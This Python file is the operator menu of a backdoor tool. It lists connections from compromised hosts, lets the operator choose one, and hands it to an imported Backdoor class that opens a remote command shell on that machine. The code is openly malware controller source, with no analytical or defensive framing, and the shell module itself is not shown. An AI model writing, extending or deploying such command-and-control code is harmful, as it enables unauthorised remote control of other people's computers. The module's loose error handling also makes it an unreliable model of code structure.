from time import sleep
from os import system
from sys import stderr, exit
# lib
from .backdoor import Backdoor

class Menu():
    def __init__(self, cons, addrs, ip_addr, port, shell_port):
        self.cons = cons 
        self.addrs = addrs
        self.ip_addr = ip_addr
        self.port = port 
        self.shell_port = shell_port
        self.status = 1

    def display_menu(self):
        print("\n\n")
        print("==== Backdoor Main Menu ====")
        print("     ==================     ")
        print("l  --  list connections")
        print("x  --  execute backdoor")
        print("c  --  clear screen")
        print("h  --  display help menu")
        print("q  --  quit program")
        print("====                    ====")

    def wait_cmd(self):
        cmd = ""
        while cmd == "":
            cmd = input(">>> ")
        return cmd

    def list_connections(self):
            i = 0
            print("\n\n")
            print("====  Connections  ====")
            for addr in self.addrs:
                print("->  %d  --  %s  --  %d  " % (i, addr[0], addr[1]))
                i += 1
            print("====               ====")

    def execute_backdoor(self):
        self.list_connections()
        try:
            cmd = self.wait_cmd()
            cmd = int(cmd)       
        except:
            system("clear")
            self.execute_backdoor()
        try:
            con = self.cons[cmd]
        except:
            system("clear")
            stderr.write("[x] Index out of bounds\n\n")
            self.execute_backdoor()

        system("clear")
        backdoor = Backdoor(con, self.ip_addr, self.port, self.shell_port)
        backdoor.cmd_shell()
            

    def execute_cmd(self, cmd):
        if cmd == "q":
            self.status = 0
        elif cmd == "l":
            system("clear")
            self.list_connections()
        elif cmd == "c":
            system("clear")
        elif cmd == "x":
            self.execute_backdoor()
        else:
            self.display_menu()

    def main_menu(self):
        #system("clear")
        self.display_menu()
        while self.status != 0:
            cmd = self.wait_cmd()
            self.execute_cmd(cmd)